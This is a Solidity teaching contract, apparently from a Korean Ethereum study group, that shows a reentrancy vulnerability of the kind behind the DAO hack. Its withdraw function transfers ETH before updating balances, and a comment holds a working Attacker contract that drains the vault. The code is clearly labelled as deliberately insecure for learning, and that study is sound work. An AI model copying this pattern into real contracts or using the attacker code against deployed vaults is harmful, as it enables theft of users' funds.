// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

/// @title Vault (취약한 버전 - 교육용)
/// @author Bay-17th Ethereum Study
/// @notice WARNING: 이 컨트랙트는 재진입 공격에 취약합니다. 절대 프로덕션에서 사용하지 마세요!
/// @dev The DAO 해킹(2016, $60M 손실)과 동일한 취약점을 포함합니다.
///
/// ============================================
/// WARNING: 취약한 코드 - 학습 목적 전용
/// ============================================
///
/// 이 컨트랙트는 재진입(Reentrancy) 공격을 설명하기 위해 의도적으로 취약하게 작성되었습니다.
/// 실제 프로젝트에서는 절대 이런 패턴을 사용하지 마세요.
///
/// 공격 시나리오:
/// 1. 공격자가 Attacker 컨트랙트를 통해 deposit()으로 1 ETH 입금
/// 2. 공격자가 withdraw(1 ether) 호출
/// 3. Vault가 공격자에게 1 ETH 전송 (call)
/// 4. Attacker의 receive()가 트리거되어 다시 withdraw(1 ether) 호출
/// 5. Vault는 아직 balances를 업데이트하지 않았으므로 또 전송
/// 6. 반복... Vault가 빈털터리가 될 때까지
///
/// 공격자 컨트랙트 예시:
/// ```solidity
/// contract Attacker {
///     Vault public vault;
///
///     constructor(address _vault) {
///         vault = Vault(_vault);
///     }
///
///     function attack() external payable {
///         vault.deposit{value: msg.value}();
///         vault.withdraw(msg.value);
///     }
///
///     receive() external payable {
///         if (address(vault).balance >= 1 ether) {
///             vault.withdraw(1 ether);
///         }
///     }
/// }
/// ```
contract Vault {
    // ============================================
    // 상태 변수
    // ============================================

    /// @dev 사용자별 예치금 잔액
    mapping(address => uint256) public balances;

    // ============================================
    // 이벤트
    // ============================================

    /// @dev 입금 시 발생하는 이벤트
    event Deposited(address indexed user, uint256 amount);

    /// @dev 출금 시 발생하는 이벤트
    event Withdrawn(address indexed user, uint256 amount);

    // ============================================
    // 외부 함수
    // ============================================

    /// @notice ETH를 Vault에 예치합니다
    /// @dev msg.value만큼 예치하고 Deposited 이벤트를 발생시킵니다
    function deposit() public payable {
        // 잔액 증가
        balances[msg.sender] += msg.value;

        // 입금 이벤트 발생
        emit Deposited(msg.sender, msg.value);
    }

    /// @notice 예치한 ETH를 출금합니다
    /// @dev WARNING: 이 함수는 재진입 공격에 취약합니다!
    /// @param amount 출금할 ETH 양 (wei 단위)
    ///
    /// ========================================
    /// ❌ 취약한 코드: 외부 호출 후 상태 업데이트
    /// ========================================
    ///
    /// 문제점:
    /// - call()로 외부 호출을 먼저 수행
    /// - 상태(balances) 업데이트는 나중에 수행
    /// - 외부 호출 중에 재귀적으로 withdraw() 호출 가능
    function withdraw(uint256 amount) public {
        // ========================================
        // Checks (검증) - 이 부분은 올바름
        // ========================================
        // 잔액이 충분한지 확인
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // ========================================
        // ❌ 위험: Interactions (상호작용) 먼저!
        // ========================================
        // call()로 ETH 전송 - 이 시점에서 공격자의 receive()가 실행됨
        // 공격자의 receive()가 다시 withdraw()를 호출하면
        // balances[msg.sender]는 아직 그대로이므로 검증을 통과함
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        // ========================================
        // ❌ 위험: Effects (상태변경) 나중에!
        // ========================================
        // 이 줄에 도달하기 전에 위의 call()에서 재진입이 발생하면
        // 공격자는 balances가 업데이트되기 전에 반복 출금 가능
        unchecked {
            balances[msg.sender] -= amount;
        }

        // 출금 이벤트 발생
        emit Withdrawn(msg.sender, amount);
    }

    // ============================================
    // View 함수
    // ============================================

    /// @notice Vault의 총 잔액을 반환합니다
    /// @return Vault 컨트랙트가 보유한 ETH 총량 (wei)
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}